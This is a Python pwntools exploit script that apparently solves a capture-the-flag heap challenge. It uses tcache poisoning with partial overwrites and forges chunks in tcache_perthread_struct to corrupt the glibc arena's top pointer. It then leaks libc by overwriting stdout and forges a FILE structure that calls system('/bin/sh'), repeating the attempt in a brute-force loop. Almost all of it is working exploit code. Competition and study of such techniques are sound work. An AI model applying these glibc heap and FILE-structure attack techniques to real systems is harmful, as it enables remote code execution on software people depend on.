from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess

context.arch = "amd64"
context.word_size = 64

file = "./silence-of-three_patched"
args = []
io: process = None

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    define zap_fix
    patc q 0x5555555622a0 0x555000037702
    end
    define allocs
    p (char*[128])chunks
    end
    c
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote("a-silence-of-three-parts.chal.idek.team", 1337)

def launch_local():
    global file, io
    io = process([file, *args])
    # debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
binsh = lambda: next(libc.search(b"/bin/sh\0"))

def launch():
    l = launch_local
    # l = launch_remote
    with context.local(log_level=logging.ERROR):
        l()
    if l == launch_remote:
        leak = recvu(b"===================")
        pow = getb(leak, b") solve ", b"\n").decode()
        proc = subprocess.Popen(["python3", "pow.py", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        pow = proc.communicate()[0]
        sla(b"Solution? ", pow)

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]

#
# exploit goes here
#

exe = ELF(file)
libc = ELF("./libc.so.6")

count = 0
tries = 0
tries_log = log.progress("Tries")
def exploit():
    def malloc(size, data=b"\n", a=1):
        global count
        sla(b": ", b"0")
        sla(b": ", str(size).encode())
        sa(b": ", data)
        if a:
            recvu(b": ")
        count += 1
        return count - 1
    def free(index):
        sla(b": ", b"1")
        sla(b": ", str(index).encode())
    def zap(index):
        sla(b": ", b"2")
        sla(b": ", str(index).encode())

    def malloc_fill_tcache(size):
        return [malloc(size) for _ in range(7)]
    def free_fill_tcache(chunks):
        for c in chunks:
            free(c)

    step1_tcache1 = malloc(0x28)
    step1_tcache2 = malloc(0x28)

    free(step1_tcache2)
    free(step1_tcache1)

    zap(step1_tcache1) # pray for page's lsb to be 0x60, 8 bit bruteforce, fd will point near the end of tcache_perthread_struct
    # input("zapped") # fix the fd when debugging


    payload = flat([
        b"A"*(0x430-0x30-0x30-0x10-0x30),

        0,
        0x21, # make valid chunk when free-ing the unsorted in the tcache_perthread_struct
        0,
        0,

        0,
        0x21,
    ])
    tmp = malloc(0x3d8, payload)
    tcache_count_0x3e0 = malloc(0x3d8) # allocate before to avoid touching the bins after
    tcache_count_0x3e0_2 = malloc(0x3d8) # those chunks will be freed to increment the tcache count 0x3e0 (if count is 0, malloc won't use the tcache 0x3e0)
    tcache_count_0x3e0_3 = malloc(0x3d8)
    tcache_count_0x3e0_4 = malloc(0x3d8)
    free(tmp) # populate tcache entry 0x3e0, we will partial overwrite it to get control of the tcache_perthread_struct later

    free_fill_tcache(malloc_fill_tcache(0x88)) # fill 0x90 tcache for later

    malloc(0x28) # update tcache entry
    # also don't forget to change the partial overwrite value when debugging (the upper 0)
    malloc(0x28, flat(0, 0x431) + p16(0x0270)) # fake 0x430 header + partial overwrite to make an unsorted in the tcache_perthread_struct
    
    tmp = malloc(0x3d8) # malloc the partial overwritten tcache entry
    free(tcache_count_0x3e0)
    malloc(0xf8, p64(0xffff000000000001)*(0xf0//8)) # spray top fake size to bypass chunk out of heap check when free-ing the unsorted in the arena
    free(tmp) # become an unsorted


    unsorted = malloc(0x428, p8(0)) # offset in arena
    malloc(0x3d8, flat(0, 0x10001, 0, 0x91)) # fake top header + fake unsorted header
    free(tcache_count_0x3e0_2) # free to increment tcache count 0x3e0
    free(unsorted) # free tcache_perthread_struct unsorted to re use later for future overwrites in arena

    unsorted = malloc(0x428, p8(0x10+0x90)) 
    malloc(0x3d8, flat(0, 0x21)) # make valid chunk when free-ing unsorted later
    free(tcache_count_0x3e0_3) # free to increment tcache count 0x3e0
    free(unsorted) # free tcache_perthread_struct unsorted to re use later for future overwrites in arena

    unsorted = malloc(0x428, p8(0x10+0x90+0x20)) 
    malloc(0x3d8, flat(0, 0x21)) # make valid chunk when free-ing unsorted later
    free(tcache_count_0x3e0_4) # free to increment tcache count 0x3e0
    free(unsorted) # free tcache_perthread_struct unsorted to re use later for future overwrites in arena


    unsorted = malloc(0x428, p8(0x20))
    tmp = malloc(0x3d8, p8(0x00)) # will partial overwrite arena->top, top will point in the chunk behind old top, this chunk contains large sizes (line 143) to bypass out of heap checks
    free(tmp) # make an unsorted in the arena, arena->top is overwritten with a libc pointer

    malloc(0x38, p8(0x00)) # allocate a bit of the arena unsorted to move the top behind (the fake top header is at 0x10 bytes before, else we just get a top with size 0x90)

    malloc(0xaa8) # allocate from top, top is now just before stdout

    payload = flat([
        0xfbad1800,
        0,
        0,
        0,
    ]) + b"\0"
    stdout = malloc(0x478, payload, a=False) # stdout leak

    libc.address = u64(recvn(8)) - 0x204644
    if (libc.address >> 48) != 0:
        raise EOFError
    success("libc: %#018x", libc.address)

    free(stdout) # free the chunk, will merge with top, re-overwrite stdout later

    file = FileStructure()
    file.flags = 0x3b01010101010101
    file._IO_read_ptr = b"/bin/sh\0"
    file._lock =  libc.sym["_IO_stdfile_1_lock"]
    file._wide_data = libc.sym["_IO_2_1_stdout_"] + 0x10
    file.vtable = libc.address + 0x2022b0
    payload = bytes(file) + p64(libc.sym.system) + p64(0) + p64(libc.sym["_IO_2_1_stdout_"] + 0xe0 - 0x68)
    
    stdout = malloc(0x478, payload, a=False) # re-overwrite stdout
    success("shell")

    io.interactive()
    input("end")
    exit()

# launch()
# exploit()
# exit()

while True:
    count = 0
    tries += 1
    tries_log.status(str(tries))

    launch()
    try:
        exploit()
    except EOFError:
        pass
    with context.local(log_level=logging.ERROR):
        io.close()
    # sleep(0.05)